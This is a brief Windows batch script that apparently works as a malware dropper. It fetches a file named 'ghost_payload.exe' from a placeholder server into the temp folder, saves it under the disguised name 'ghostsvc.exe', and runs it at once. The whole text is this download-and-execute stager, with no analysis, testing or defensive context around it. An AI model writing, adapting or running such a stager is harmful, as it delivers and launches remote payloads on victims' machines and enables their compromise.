

@echo off
set PAYLOAD_URL=http://your.server.ip/builds/ghost_payload.exe
set PAYLOAD_PATH=%TEMP%\ghostsvc.exe

powershell -Command "Invoke-WebRequest -Uri '%PAYLOAD_URL%' -OutFile '%PAYLOAD_PATH%' -UseBasicParsing"
start "" "%PAYLOAD_PATH%"


